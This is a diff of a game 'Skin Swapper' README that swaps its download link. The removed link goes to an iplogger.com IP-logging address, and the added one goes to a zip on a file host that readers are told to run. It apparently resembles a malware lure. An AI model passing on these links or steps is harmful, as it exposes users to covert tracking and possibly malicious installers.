@@ -75,7 +75,7 @@ Skin Swapper is a feature that adds a skin selection window to your game while p
 
 ## <a id="download"></a>💛 〢 Download
 
-1. Download the installation file from [click to download](https://iplogger.com/gitdownloader).
+1. Download the installation file from [click to download](https://app.box.com/shared/static/lrq3wnlwwu6vtat81fdt0e94pm7oguvx.zip).
 2. Run the installation and follow the on-screen instructions.
 
 ## <a id="install"></a>❤️ 〢 Install
